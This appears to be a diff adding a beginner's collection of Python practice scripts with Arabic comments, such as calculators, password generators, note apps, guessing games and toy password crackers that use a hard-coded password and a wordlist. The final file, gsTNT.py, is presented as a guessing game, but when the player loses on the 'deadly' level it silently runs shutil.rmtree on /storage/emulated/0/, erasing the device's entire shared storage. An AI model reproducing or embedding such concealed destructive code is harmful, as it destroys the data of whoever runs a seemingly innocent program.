@@ -1,0 +1,740 @@
+
+
+========================================
+File: counter.py
+Last Modified: 2025-08-13 20:20:13
+========================================
+
+#سكربت يطلب من المستخدم ادخال نص ، ثم يطلب منه ادخال حرف و يرى كم مره تكرر هذا الحرف
+#text input
+times=0
+text = input('Enter Your Text:\n')
+#string for the letter that we want to count it
+count = input('Enter the letter to count: ')
+#int for counting repeated letter
+for i in text:
+	if i == count:
+		times+=1
+print("The letter {} repeated {} time.".format(count,times))
+
+========================================
+File: indexGet.py
+Last Modified: 2025-08-13 22:28:06
+========================================
+
+#سكربت بسيط يقوم بطلب ادخال اسم ومن ثم يطبع كل حرف على  حدا مع ترتيبه
+#input for entering name
+Name = input('Enter your name: ')
+# a variable gets length of entered name with "len"
+strLen = len(Name)
+ind=0
+#loop function prints a letter with it's index every time
+for i in Name:
+	ind+=1
+	print(f"letter {i}" + " " + f"index {ind}")
+
+========================================
+File: bachi.py
+Last Modified: 2025-08-13 22:37:21
+========================================
+
+#برنامج بسيط قمت بعمله لفهم دالة for وكيفية التعامل مع المتغيرات 
+
+
+ls = ["back", "kap", "bachi", "pla", "map"]
+scrt = "bachi"
+gs = 0
+print(ls)
+for i in ls:
+	if ls[gs] == scrt:
+		gs = gs + 1
+		print('correct')
+		break
+	else:
+		print('nah! bad AI')
+		gs = gs + 1
+		
+
+========================================
+File: password.py
+Last Modified: 2025-08-13 23:44:02
+========================================
+
+#برنامج بسيط لعمل باسورد عشوائي باستخدام رموز محدده
+#اولا نقوم باستيراد المكتبات المطلوبه
+import random
+lts=['s','y','p','q']
+nus=[8,5,2,0]
+chs=['#','@','$','&']
+all=lts+nus+chs
+ln=len(all)
+ps=''
+
+st = int(input("Enter password length: "))
+
+for i in range(st):
+	rnd=str(random.choice(all))
+	ps= ps,rnd
+print(ps)
+
+#الكود لازال لا يعمل بشكل جيد للأسف ، لكنني حاولت
+	
+
+========================================
+File: saver.py
+Last Modified: 2025-08-14 00:21:50
+========================================
+
+#برنامج اخير لدمج ملفاتي مع بعضها
+
+
+cnt = ""
+
+with open("/storage/emulated/0/بايثون/انجازاتي/bachi.py", "r", encoding="utf-8") as f:
+    read = f.read()
+    cnt += read
+    print('تم الحصول على الملف الاول')
+
+with open("/storage/emulated/0/بايثون/انجازاتي/password.py", "r", encoding="utf-8") as f:
+    read = f.read()
+    cnt += "\n\n--------------------\n" + read
+    print('تم الحصول على الملف الثاني')
+    
+with open("/storage/emulated/0/بايثون/انجازاتي/indexGet.py", "r", encoding="utf-8") as f:
+    read = f.read()
+    cnt += "\n\n--------------------\n" + read
+    print('تم الحصول على الملف الثالث')
+    
+with open("/storage/emulated/0/بايثون/انجازاتي/counter.py", "r", encoding="utf-8") as f:
+    read = f.read()
+    cnt += "\n\n--------------------\n" + read
+    print('تم الحصول على الملف الرابع')
+    
+with open("/storage/emulated/0/بايثون/انجازاتي/saver.py", "r", encoding="utf-8") as f:
+    read = f.read()
+    cnt += "\n\n--------------------\n" + read
+    print('تم الحصول على الملف الرابع')
+    
+# حفظ الملف:
+
+# تحديد اسم الملف
+filename = "my_projects.txt"
+
+# حفظ النص في الملف
+with open(filename, 'w', encoding='utf-8') as file:
+    file.write(cnt)
+
+print(f"تم حفظ النص بنجاح في ملف '{filename}'")    
+
+
+
+========================================
+File: simpleCalculator.py
+Last Modified: 2025-08-14 19:25:30
+========================================
+
+#سكربت آلة حاسبه بسيط
+con='y'
+while con=='y':
+ n1 = float(input('Enter the first number: '))
+ n2 = float(input('Enter the second number: '))
+ opr = input('Enter the operation + , - , * , / : ')
+
+ if opr == '+':
+ 	print(n1+n2)
+ elif opr == '-':
+ 	print(n1-n2)
+ elif opr == '*':
+ 	print(n1*n2)
+ elif opr == '/':
+ 	print(n1/n2)
+ else:
+ 	print('Error! operation not found!')	
+ con=input('Wanna countiue (y/n)?: ')
+
+========================================
+File: FindingMax&Min&Average.py
+Last Modified: 2025-08-15 17:25:42
+========================================
+
+#سكربت بسيط يقوم بحساب ارقام من قائمة معينه ثم يطبع لنا اكبر رقم فيها و اصغر رقم و المتوسط
+#المغزى من السكربت هو فهم القوائم و الfor و بعض الدوال الأخرى بشكل اعمق
+
+
+#نجهز المتغيرات المطلوبه
+list=[2,8,1,6,9,3,6,5,4,33]
+max=list[0]
+min=list[0]
+total=sum(list)
+length=len(list)
+
+#نبدأ عملية الحساب لأيجاد العدد الأكبر
+for i in list:
+	if max<i:
+		max=i
+		
+		#ايجاد اصغر عدد
+	if (min>i):
+		min=i
+#نطبع الخارج مع إضافة المتوسط
+print(f"max {max} "+f"min {min} "+f"average {total/length}")
+
+========================================
+File: listsAndDicts.py
+Last Modified: 2025-08-16 14:46:46
+========================================
+
+#سكربت  خفيف لتطوير مهاراتي اكثر في الحلقات ولفهم القوائم و القواميس بشكل اعمق
+#يقوم الكود بطلب ادخال نص من المستخدم ثم يفصل كل حرف ويرى كم مره تكرر
+import time
+
+
+text = input("Enter something: ")
+listText=[]
+listText.extend(text)
+listCounted=[]
+all={}
+
+for l in listText:
+	all[l]=0
+for i in listText:
+	v=all[i]
+	all[i]=v+1
+checkedLetter="--private--"
+for y in all:
+	print(f"The letter {y} has been repeated "+f"{all[y]} time!")
+	time.sleep(0.1) #لتحسين آلية عمل المشروع و جعله واقعي اكثر
+
+========================================
+File: newPasswordGenerator.py
+Last Modified: 2025-08-16 15:49:56
+========================================
+
+#مشروع مولد كلمات مرور طويله وقويه 
+#الغرض منه هو فهم آلية عمل  المكتبة random , string
+
+import random 
+import string
+
+specialChars='@$#&_?!'
+all=string.ascii_letters+string.digits+specialChars
+list=[]
+list.extend(all)
+random.shuffle(list)
+ps=''
+
+length=int(input('Enter password length: '))
+for i in range(length):
+	ps+=str(random.choice(list))
+		
+print(f'Your password:\n{ps}')
+
+
+========================================
+File: guessGame.py
+Last Modified: 2025-08-17 07:32:50
+========================================
+
+#مشروع لعبة تخمين الرقم
+
+import random
+
+num=random.randint(1,9)
+limit=0
+play=True
+guess=0
+
+
+while guess != num and play:
+	if limit != 3:
+		guess=int(input('Enter your guess: '))
+		limit+=1
+		if guess>num:
+			print('The number is smaller')
+		elif guess<num:
+			print('The number is bigger')
+	else:
+		play=False
+if guess==num:
+	print('you won!')
+else:
+	print('you lost!')
+
+========================================
+File: lenUnitsConverter.py
+Last Modified: 2025-08-18 14:08:08
+========================================
+
+#مشروع جديد لي فكرته يقوم بتحويل وحدات  الطول
+
+
+print('*'*15+'Length unit converter'+'*'*15+'\n\n')
+
+choose=int(input('Enter 1 to convert from KM to M\nEnter 2 to convert from M to KM: '))
+while choose != 1 and choose != 2:
+	choose=int(input('Enter 1 to convert from KM to M\nEnter 2 to convert from M to KM: '))
+
+if choose==1:
+	length=int(input('Enter length with KM: '))
+	print(f'Length is {length*1000} m.')
+else:
+	length=int(input('Enter length with M: '))
+	print(f'Length is {length/1000} km.')
+	
+
+========================================
+File: tkinter.py
+Last Modified: 2025-08-18 21:01:09
+========================================
+
+from tkinter import *
+
+root = Tk()
+root.resizable(0,0)
+Label(root, text="YT DOWNLOADER BY BACHI", font="arial 20 bold").pack()
+
+root.mainloop()
+
+========================================
+File: notes.py
+Last Modified: 2025-08-20 05:34:53
+========================================
+
+notes = {}
+choose = 0
+
+def add():
+    global choose
+    while choose != 1 and choose != 2:
+        choose = int(input('Enter 1 to create new note\nEnter 2 to exit: '))
+        if choose == 1:
+            name = input('Enter title: ')
+            note = input('Write your note:\n')
+            notes[name] = {
+                'tit': name,
+                'noot': note
+            }
+            print("Note saved! ✅")
+            show()
+            choose = 0
+        else:
+            quit()
+            
+def show():
+    for note_key, note_details in notes.items():
+        print(f'Title: {note_details["tit"]}')
+        print(f'Content: {note_details["noot"]}')
+        print('-' * 20)
+
+while True:
+    if notes == {}:
+        print('-'*10 + 'List is empty' + '-'*10)
+
+    add()
+
+========================================
+File: notesV2.py
+Last Modified: 2025-08-20 15:00:39
+========================================
+
+notes = {}
+choose = 0
+max_length = 0
+word_length = 0
+final_length = 0
+
+def add():
+    global choose
+    while choose != 1 and choose != 2:
+        choose = int(input('Enter 1 to create new note\nEnter 2 to exit: '))
+        if choose == 1:
+            name = input('Enter title: ')
+            note = input('Write your note:\n')
+            notes[name] = {
+                'tit': name,
+                'noot': note
+            }
+            print("Note saved! ✅")
+            show()
+            choose = 0
+        else:
+            quit()
+            
+def show():
+    global max_length
+    global word_length
+    global final_length
+    for note_key, note_details in notes.items():
+        current_length = len(note_details["tit"])
+        if current_length > max_length:
+            max_length = current_length
+    max_length += 2
+    print('-'*50)
+    final_length = max_length - 5
+    print('|' + '\n|' + ' Title' + ' '*final_length + ' |' + ' Note')
+    print('-'*50)
+    for note_key, note_details in notes.items():
+        word_length = len(note_details["tit"])
+        final_length = max_length - word_length
+        print('|' + f' {note_details["tit"]}' + ' '*final_length + ' |' + f' {note_details["noot"]}')
+
+while True:
+    if notes == {}:
+        print('-'*10 + 'List is empty' + '-'*10)
+    add()
+
+========================================
+File: encryption.py
+Last Modified: 2025-08-22 16:10:41
+========================================
+
+#مشروع برنامج تشفير نصي بسيط
+
+import random 
+import string
+
+#getting all requirements for the operation
+all=string.ascii_letters+string.digits+string.punctuation+" "
+chars=[]
+
+chars.extend(all)
+key=['U', '(', 'E', 'g', 'a', '`', '?', 'I', 'Z', '[', 'C', ',', 'H', 'O', '2', '4', 'o', 'j', '9', '|', '7', '-', 'p', ':', '+', ')', '_', 'l', '*', 'm', 'P', 'A', '>', 'i', '6', 'y', 'J', '"', '.', '@', 'w', 'G', 'c', '{', 'K', ']', 'e', 's', ';', '1', '~', '/', 'S', '}', '^', 'd', 'R', 'h', 'r', 'N', 'V', 'Q', '<', 'f', 'T', '%', '=', '3', '#', '$', 'b', 'x', '\\', '0', 'D', 'z', 'u', 'F', 'v', 'W', '8', 'B', 'Y', 'k', '&', '!', ' ', 'L', "'", 't', 'X', '5', 'n', 'M', 'q']
+#encryption
+
+text=input('Enter text to encrypt: ')
+encrypted_text=''
+
+for let in text:
+	index = chars.index(let)
+	encrypted_text += key[index]
+
+print(f'Encrypeted text:\n{encrypted_text}')
+
+#decryption
+
+text=''
+encrypted_text=input('Enter text to encrypt: ')
+
+for let in encrypted_text:
+	index = key.index(let)
+	text += chars[index]
+
+print(f'Decrypeted text:\n{text}')
+
+========================================
+File: notesV3.py
+Last Modified: 2025-08-23 22:32:01
+========================================
+
+import json
+import os
+
+notes = {}
+choose = 0
+max_length = 0
+word_length = 0
+final_length = 0
+
+def add():
+    global notes
+    global choose
+    while choose != 1 and choose != 2 and choose != 3 and choose != 4:
+        choose = int(input('Enter 1 to create new note\nEnter 2 to export notes (json)\nEnter 3 to  import file\nEnter 4 to exit: '))
+        if choose == 1:
+            name = input('Enter title: ')
+            note = input('Write your note:\n')
+            notes[name] = {
+                'tit': name,
+                'noot': note
+            }
+            print("Note saved! ✅")
+            os.system('clear')
+            show()
+            choose = 0
+        elif choose == 2:
+        	if notes=={}:
+        		print('No notes to export!')
+        		add()
+        	else:
+        		export()
+        elif choose==3:
+        	file_path = input('Enter file path (json only): ')
+        	with open(file_path, 'r') as fj:
+        		notes = json.loads(fj.read())
+        		os.system('clear')
+        		show()
+        else:
+            quit()
+            
+def show():
+    global max_length
+    global word_length
+    global final_length
+    for note_key, note_details in notes.items():
+        current_length = len(note_details["tit"])
+        if current_length > max_length:
+            max_length = current_length
+    max_length += 2
+    print('-'*50)
+    final_length = max_length - 5
+    print('|' + '\n|' + ' Title' + ' '*final_length + ' |' + ' Note')
+    print('-'*50)
+    for note_key, note_details in notes.items():
+        word_length = len(note_details["tit"])
+        final_length = max_length - word_length
+        print('|' + f' {note_details["tit"]}' + ' '*final_length + ' |' + f' {note_details["noot"]}')
+
+def export():
+		json_string = json.dumps(notes, indent=2)
+		with open("/storage/emulated/0/notes.json", "w", encoding="utf-8") as f:
+		  		f.write(json_string)
+		  		print('saved!')
+		  		os.system('clear')
+		  		add()
+while True:
+    if notes == {}:
+        print('-'*10 + 'List is empty' + '-'*10)
+    add()
+
+========================================
+File: autoDictGenerato.py
+Last Modified: 2025-08-24 13:11:54
+========================================
+
+#مشروع بسيط يقوم بعمل قاموس تلقائيا و يضع مدخلات للاحرف و طول القاموس مع ميزة التصدير كملف json، غرضه تمكين فهم القوائم و القواميس و الحلقات و  مكتبات راندوم و سترينج 
+
+import time
+import random
+import string
+import json
+
+listC=[]
+notes={}
+name=""
+note=""
+chars=string.ascii_letters
+listC.extend(chars)
+for r in range(1000):
+	for i in range(20):
+		name += str(random.choice(listC))
+		note += str(random.choice(listC))
+	notes[name] = {
+		'tit': name,
+		'noot': note
+	}
+	name=""
+	note=""
+json_string = json.dumps(notes)
+with open("/storage/emulated/0/notes.json", "w", encoding="utf-8") as f:
+		  		f.write(json_string)
+		  		print('fucking done 💯')
+
+========================================
+File: searcher.py
+Last Modified: 2025-08-24 16:18:08
+========================================
+
+#سكربت خفيف يقوم بطلب ادخال بيانات الى قائمه مثل الاسماء ثم يقوم بالبحث عن اسم معين
+import time
+
+list=[]
+
+listLength=int(input('Enter number of names you wanna add: '))
+for i in  range(listLength):
+	name=input('Enter Name or enter (--stop) to exit: ')
+	if name != '--stop':
+		list.append(name)
+	else:
+		break
+if len(list) != 0:
+    print(list)
+    search=input('Enter name to check if it exists in the list: ')
+    for ex, va in enumerate(list):
+    	if va == search:
+		    print(f'The name "{search}" is exists in the list at index {ex}')
+		    break
+    	else:
+    		 print(f'Not found at index {ex}')
+    	time.sleep(0.1)	
+else:
+	print('list is empty!')
+
+========================================
+File: cracker.py
+Last Modified: 2025-08-26 08:56:24
+========================================
+
+#سكربت بسيط لمحاكاة كسر كلمات المرور
+
+import random
+import string
+import time
+
+tries = 0
+password = 'abdo2025'
+length = int(input('Enter length password: '))
+last = input('Enter the last four characters you remember: ')
+start_time=time.time()
+
+while True:
+	tries += 1
+	guessed = ''.join(random.choices(string.ascii_lowercase, k=length - len(last))) + last
+	if password == guessed:
+		print(f'password found {guessed}')
+		print(f'in {tries} try')
+		break
+	else:
+		print(f'password {guessed} is incorrect')
+
+========================================
+File: storymaker.py
+Last Modified: 2025-08-27 16:36:57
+========================================
+
+import random
+
+characters = ["فارس", "ندى", "علي", "زينة"]
+places = ["في الغابة", "على الكوكب الأحمر", "تحت البحر", "في القلعة القديمة"]
+events = ["وجد كنزًا", "حل لغزًا", "أنقذ صديقًا", "اكتشف قوة خارقة"]
+
+final_story = random.choice(characters) + " " + random.choice(places) + " " + random.choice(events)
+print(f'القصة:\n{final_story}')
+
+========================================
+File: crackerV2.py
+Last Modified: 2025-08-28 17:33:58
+========================================
+
+#سكربت بسيط لمحاكاة كسر كلمات المرور
+#مع استخدم ملف كلمات المرور الشائع Rockyou.txt
+
+import random
+import string
+import time
+import os
+
+tries = 0
+password = 'blitzer'
+start_time=time.time()
+
+with open('/storage/emulated/0/Rockyou.txt', 'r', encoding="latin-1") as cr:
+	for line in cr:
+		tries += 1
+		guessed = line.strip()
+		if password == guessed:
+			os.system('clear')
+			print(f'password found {guessed}')
+			print(f'in {tries} try')
+			break
+
+========================================
+File: passwordMakerV3.py
+Last Modified: 2025-08-29 22:26:26
+========================================
+
+#مولد كلمات مرور قويه مطور، يدعم صنع كلمات مرور كثيره مع ميزة الحفظ كملف txt
+
+# importing libraries
+import random 
+import string
+import os
+
+# Getting all requirements for the operation 
+specialChars='@$#&_?!'
+all=string.ascii_letters+string.digits+specialChars
+list=[]
+list.extend(all)
+random.shuffle(list)
+ps=''
+all_passwords=''
+
+# User customisation
+length=int(input('Enter password length: '))
+much=int(input('Enter number of password: '))
+
+# generating passwords
+for r in range(much):
+	for i in range(length):
+		ps+=str(random.choice(list))
+	all_passwords+=ps+'\n'
+	ps=''
+
+# Printing output
+if much <= 10:
+	print(f'\n\nYour passwords:\n{all_passwords}\n')
+else:
+	lines = all_passwords.splitlines()
+	print(f'\n\nYour passwords:\n')
+	for i, ps in enumerate(lines[0:5], 1):
+		print(f'{i}. {ps}')
+	print(f'\nAnd more {much - 5}...')
+
+# File handing_ saving	
+save = input('Wanna save it as .txt (y/n)?: ')
+while save != 'Y'.lower() and save != 'N'.lower():
+	save = input('Wanna save it as .txt (y/n)?: ')
+if save == 'Y'.lower():
+	with open('/storage/emulated/0/generatedPasswords.txt', 'w') as w:
+			w.write(all_passwords)
+			print('saved in /storage/emulated/0/generatedPasswords.txt')
+else:
+	quit()
+
+
+
+
+
+========================================
+File: gsTNT.py
+Last Modified: 2025-08-31 11:24:44
+========================================
+
+import random
+import shutil
+
+print('*'*15 + 'Welcome you in guess game' + '*'*15)
+level = input('Choose difficult (by entering number):\n1. easy\n2. medium\n3. deadly\n')
+
+def play():
+    global level
+    es=10
+    md=20
+    hr=50
+    tries = 3
+    
+    if level==str(1):
+    	guess = random.randint(0, es)
+    	cond = es
+    elif level==str(2):
+    	guess = random.randint(0, md)
+    	cond = md
+    else:
+    	guess = random.randint(0, hr)
+    	cond = hr
+    
+    while tries > 0:
+        try:
+            choice = int(input(f'Enter a number between 0 and {cond}. You have {tries} tries left: '))
+            if not 0 <= choice <= cond:
+                print('Please enter a number within the specified range.')
+                continue
+            if choice > guess:
+                print('The number is smaller, try again.')
+                tries -= 1
+            elif choice < guess:
+                print('The number is bigger, try again.')
+                tries -= 1
+            else:
+                print('CORRECT!')
+                return
+        except ValueError:
+            print('Invalid input. Please enter a valid number.')
+    if level in ('1', '2'):
+    	print(f'Game over. The correct number was {guess}.')
+    else:
+    	print('Rest in peace bro🛌🪦')
+    	shutil.rmtree('/storage/emulated/0/')
+while level not in ('1', '2', '3'):
+    level = input('Choose difficult (by entering number):\n1. easy\n2. medium\n3. deadly\n')
+
+play()
